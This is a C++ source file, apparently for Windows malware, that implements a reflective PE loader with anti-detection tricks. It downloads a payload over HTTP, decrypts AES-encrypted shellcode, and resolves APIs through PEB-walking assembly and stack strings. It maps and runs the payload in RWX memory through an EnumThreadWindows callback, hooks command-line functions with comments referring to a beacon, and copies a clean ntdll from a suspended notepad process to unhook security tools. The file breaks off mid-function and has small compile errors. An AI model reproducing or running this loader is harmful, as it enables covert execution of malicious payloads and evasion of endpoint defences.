#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>
#include "HttpRequest.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() ( ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK         DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




struct DATA {

    LPVOID data;
    size_t len;

};

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;

#define RELOC_32BIT_FIELD 3

/* 定义常量 */
#define HTTP_DEF_PORT     80  /* 连接的缺省端口 */
#define HTTP_BUF_SIZE   1024  /* 缓冲区的大小   */
#define HTTP_HOST_LEN    256  /* 主机名长度 */

char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
"Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
"Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
"User-Agent: Huiyong's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

//#pragma comment(lib,"ws2_32.lib")


DWORD _getKernelBase()
{
  

    DWORD dwDllBase1;
    __asm {
        xor ebx, ebx; EBX = 0x00000000
        mov ebx, fs: [ebx + 0x30] ;
        mov ebx, [ebx + 0xC]; EBX = Address_of_LDR
            mov ebx, [ebx + 0x1C]; EBX = 1st entry in InitOrderModuleList / ntdll.dll
            mov ebx, [ebx]; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
            mov ebx, [ebx]; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
            mov eax, [ebx + 0x8]; EAX = &kernel32.dll / Address of kernel32.dll
            mov DWORD PTR dwDllBase1, eax

    }
    return dwDllBase1;
}

DWORD _getProcessAddress(DWORD address_base)
{
    //address_base = 0x76860000;
    DWORD dwDllBase1;
    __asm {

        /* push ebp
         mov ebp, esp
         sub esp, 0x40*/
         //xor ecx, ecx

        mov ebx, [address_base]; EBX = Base address
        mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
        add edx, ebx; EDX = PE Header
        mov edx, [edx + 0x78]; EDX = export table
        add edx, ebx; EDX = Export table
        mov esi, [edx + 0x20]; ESI = namestable
        add esi, ebx; ESI = Names table
        xor ecx, ecx; EXC = 0
        Get_Function:
        inc ecx; Increment the ordinal
            lodsd; Get name
            add eax, ebx; Get function name
            cmp[eax], 50746547h; GetP
            jnz Get_Function
            cmp[eax + 0x04], 41636f72h; rocA
            jnz Get_Function
            cmp[eax + 0x08], 65726464h; ddre
            jnz Get_Function
            mov esi, [edx + 0x24]; ESI = ordinals
            add esi, ebx; ESI = Ordinals table
            mov cx, [esi + ecx * 2]; Number of function
            dec ecx
            mov esi, [edx + 0x1c];  address table
            add esi, ebx; ESI = Address table
            mov edx, [esi + ecx * 4]; EDX = Pointer()
            add edx, ebx; EDX = GetProcAddress
            mov eax, edx
            mov DWORD PTR dwDllBase1, eax
            /* add esp, 0x40
             mov esp, ebp
             pop ebp
             ret*/

    }
    return dwDllBase1;

}


DWORD getFunction_LoadLibraryA(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
        mov eax, getproaddress
        push 0x00
        push 0x41797261 // Ayra
        push 0x7262694c // rbiL
        push 0x64616f4c // daoL
        push esp
        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
        call getproaddress; [ebp - 8] ->GetProcAddress Addr
        mov DWORD PTR dwDllBase1, eax

    }
    return dwDllBase1;

}



DWORD getFunction_VirtualAllocA(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
        mov eax, getproaddress
        push 0x00
        push 0x636f6c6c // coll
        push 0x416c6175 // Alau
        push 0x74726956 // triV
        push esp
        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
        call getproaddress; [ebp - 8] ->GetProcAddress Addr
        mov DWORD PTR dwDllBase1, eax

    }
    return dwDllBase1;

}

// 进行aes解密
void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {

    DATA data;
    std::vector<unsigned char> buffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                //printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (buffer.empty() == TRUE)
        {
            //printf("Failed in retrieving the Shellcode");
        }

        // Report any errors.
        if (!bResults)
            //printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = buffer.size();

        char* bufdata = (char*)malloc(size);
        for (int i = 0; i < buffer.size(); i++) {
            bufdata[i] = buffer[i];
        }
        data.data = bufdata;
        data.len = size;
        return data;

}


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;




LPWSTR hookGetCommandLineW()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
    return 0;
}

int __cdecl hookexit(int status)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");

    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
    ExitThread(0);
}
void masqueradeCmdline()
{
    //Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    //Create widestring array of pointers
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    //Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}



void freeargvA(char** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

void freeargvW(wchar_t** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}





// 仅修复表
void FixBaseRelocTable(PVOID ModuleBase, IMAGE_NT_HEADERS* NTHeader)
  {
      int    OriginalImageBase;
      int    uRelocTableSize;
      int* uRelocAddress;
      int    uIndex;
      IMAGE_DATA_DIRECTORY    ImageDataDirectory;
      IMAGE_BASE_RELOCATION* pImageBaseRelocation;
  
      //定位到可选PE头里拿到ImageBase
      OriginalImageBase = NTHeader->OptionalHeader.ImageBase;
      //printf("OriginalImageBase is :%p\n", OriginalImageBase);
      //定位到可选PE头的DataDirArray里的重定位表
      ImageDataDirectory = NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
      //重定位表的实际地址 第一个块的初始地址
      pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG)ModuleBase + ImageDataDirectory.VirtualAddress);
      //printf("pImageBaseRelocation old address is :%p\n", pImageBaseRelocation);
      //printf("pImageBaseRelocation old values is :%x\n", *pImageBaseRelocation);
      if (pImageBaseRelocation == NULL)
      {
          return;
      }
      
      while (pImageBaseRelocation->SizeOfBlock)  // 判断是否到重定位表底部
      {
          //printf("pImageBaseRelocation->SizeOfBlock is : %x \n", pImageBaseRelocation->SizeOfBlock);
          
          typedef struct
          {
              USHORT offset : 12;
              USHORT type : 4;
          }TypeOffset;
          TypeOffset* pTypeOffset = (TypeOffset*)(pImageBaseRelocation + 1);
          uRelocTableSize = (pImageBaseRelocation->SizeOfBlock - 8) / 2;  // 要修改的重定位表的数量
          for (uIndex = 0; uIndex < uRelocTableSize; uIndex++)
          {
  
             if (pTypeOffset[uIndex].type == 3)
              {
                 uRelocAddress = (int*)(pTypeOffset[uIndex].offset + pImageBaseRelocation->VirtualAddress + (int)ModuleBase);
                 *uRelocAddress = (int)ModuleBase + (*uRelocAddress - OriginalImageBase);
                 //printf("ModuleBase is : %x\n", ModuleBase);
                 //printf("RelocAddress is : %x\n", *uRelocAddress);
             }
        }
          pImageBaseRelocation = (IMAGE_BASE_RELOCATION*)((ULONG)pImageBaseRelocation + pImageBaseRelocation->SizeOfBlock);
          //printf("pImageBaseRelocation new address is :%p\n", pImageBaseRelocation);
          //printf("pImageBaseRelocation new values is :%x\n", *pImageBaseRelocation);
    }

      // 输出更新的重定向表地址
      //printf("aaapImageBaseRelocation new address is :%x\n", *(PIMAGE_BASE_RELOCATION)((ULONG)ModuleBase + ImageDataDirectory.VirtualAddress));
  }
// 从文件第一个字节定位到PE文件的头
char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {  // 判断是否是PE文件
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;  // NT头的起始位置 文件头到PE起始位置的偏移量
    //printf("e_lfanew is: %d\n", pe_offset);
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset); // PE头起始位置
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

// 通过PE文件首地址和表的偏移获取RVA
IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]); // 各表RVA及大小 0 为导出表 1为导入表

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}
// 修复重定位表
bool applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T moduleSize)
{
    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (relocDir == NULL) // 应用没有重定向表
        return false;

    size_t maxSize = relocDir->Size;
    size_t relocAddr = relocDir->VirtualAddress;
    IMAGE_BASE_RELOCATION* reloc = NULL;

    size_t parsedSize = 0;
    for (; parsedSize < maxSize; parsedSize += reloc->SizeOfBlock) {
        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + size_t(modulePtr));
        if (reloc->VirtualAddress == NULL || reloc->SizeOfBlock == 0)
            break;

        size_t entriesNum = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
        size_t page = reloc->VirtualAddress;

        BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)(size_t(reloc) + sizeof(IMAGE_BASE_RELOCATION));
        for (size_t i = 0; i < entriesNum; i++) {
            size_t offset = entry->Offset;
            size_t type = entry->Type;
            size_t reloc_field = page + offset;
            if (entry == NULL || type == 0)
                break;
            if (type != RELOC_32BIT_FIELD) {
                //printf("    [!] Not supported relocations format at %d: %d\n", (int)i, (int)type);
                return false;
            }
            if (reloc_field >= moduleSize) {
                //printf("    [-] Out of Bound Field: %lx\n", reloc_field);
                return false;
            }

            size_t* relocateAddr = (size_t*)(size_t(modulePtr) + reloc_field);
            //printf("    [V] Apply Reloc Field at %x\n", relocateAddr);
            (*relocateAddr) = ((*relocateAddr) - oldBase + newBase);
            entry = (BASE_RELOCATION_ENTRY*)(size_t(entry) + sizeof(BASE_RELOCATION_ENTRY));
        }
    }
    return (parsedSize != 0);
}
// 输入一个PE文件的首地址，并把所需要的dll加载到IAT中
bool RepairIAT(PVOID modulePtr)
{
    // 获取导入表
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;  // 导入表的长度
    size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
    printf("modulePtr: %p\n", modulePtr);

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;
    DWORD kernel32_address = _getKernelBase();
    DWORD process_address = _getProcessAddress(kernel32_address);
    printf("aaprocess address is :%d\n", process_address);
    typedef FARPROC(WINAPI* GetProcessAddressa)(HMODULE hModule,LPCSTR lpProcName);
    GetProcessAddressa GetProcessAddressB = (GetProcessAddressa) _getProcessAddress(kernel32_address);
    typedef HMODULE(WINAPI* LoadLibraryAB)(LPCSTR lpLibFileName);
    LoadLibraryAB LoadLibraryAa = (LoadLibraryAB)getFunction_LoadLibraryA(process_address, kernel32_address);
    printf("aaaloadlibrary address :%p\n", LoadLibraryAa);
    printf("GetProcessAddressB address :%p\n", GetProcessAddressB);
    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        // 获取libname的 VA 地址
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
        //printf("lib_desc:%p\n", lib_desc);
        

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        // 获取到导入dll的名字
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
        //printf("imagebase:%p\n", modulePtr);
        //printf("lib_name: %s\n", lib_name);

        size_t call_via = lib_desc->FirstThunk;  // IAT
        size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;  

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);   // IAT
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);  // INT
            // 判断是否通过序号定位函数
            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64) 
            {
                size_t addr = (size_t)GetProcessAddressB(LoadLibraryAa(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
                fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT

            }
            // 判断是否到链子的底端
            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {  // 如果相等说明没有发生重定向，两个结构体里存的都是函数名

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);   //IMAGE_IMPORT_BY_NAME结构体
                LPSTR func_name = (LPSTR)by_name->Name;  // 函数名
                printf("modulePtr: %p\n", modulePtr);

                size_t addr = (size_t)GetProcessAddressB(LoadLibraryAa(lib_name), func_name); //通过INT里的函数名获取函数地址
                printf("func_name: %s ,address is :%p\n", func_name, addr);
                // 以下是填充一些杂七杂八的运行参数
                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

// 加载PE文件 把date文件加载到内存中
void PELoader(char* data, DWORD datasize)
{
    // 获取命令行参数
    masqueradeCmdline();

    DWORD kernel32_address = _getKernelBase();
    DWORD process_address = _getProcessAddress(kernel32_address);
    typedef HMODULE(WINAPI* LoadLibraryAB)(LPCSTR lpLibFileName);
    typedef LPVOID(WINAPI* VirtualAllocB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    LoadLibraryAB LoadLibraryAa = (LoadLibraryAB)getFunction_LoadLibraryA(process_address, kernel32_address);
    VirtualAllocB VirtualAlloca = (VirtualAllocB)getFunction_VirtualAllocA(process_address, kernel32_address);
    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; }; // 校验码

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    // 获取NT头
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    printf("ntHeader: %p\n", ntHeader);
    if (!ntHeader) {
        exit(0);
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取基地址重定位表
    //printf("relocDir: %p\n", relocDir);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件中的镜像基址
    //printf("preferAddr: %p\n", preferAddr);


    HMODULE dll = LoadLibraryAa("ntdll.dll");
     printf("Loadlibrary address :%p\n", LoadLibraryAa);
    // 强制卸载
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
    
     printf("virtualloc address :%p\n", VirtualAlloca);
    // 根据PE文件加载到内存占用的总大小申请内存
    pImageBase = (BYTE*)VirtualAlloca(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("pImageBase: %p\n", pImageBase);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloca(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            printf("pImageBase: %p\n", pImageBase);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // FILL the memory block with PEdata

    // 将镜像基址赋值到pe文件头
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    //printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
    // 将文件头拷贝到内存中
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
    // 文件头的节
    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    //printf("SectionHeaderArr:%p\n",SectionHeaderArr);
    // 依次通过节数把文件中的数据拷贝到内存中
    //printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }
    printf("pImageBase address is :%p\n", pImageBase);
    // 修复IAT
    //FixBaseRelocTable(pImageBase, ntHeader);
    RepairIAT(pImageBase);
    printf("pImageBase address is :%p\n", pImageBase);
    // 修复重定向表
    if (pImageBase != preferAddr)
        if (applyReloc((size_t)pImageBase, (size_t)preferAddr, pImageBase, ntHeader->OptionalHeader.SizeOfImage))
            //puts("[+] Relocation Fixed.");
    // asm获取dll基址
    //DWORD kernelbase = _getKernelBase();
    //printf("kernelbase address is: %p", kernelbase);
    // 程序入口点
    size_t retAddr = 0;
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    //printf("AA: %d\n", AA);

}




LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    //Create our suspended process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        //printf("[-] Error creating process\r\n");
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        //printf("Failed in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);
    return pntdll;
}



// 脱钩ntdll
BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

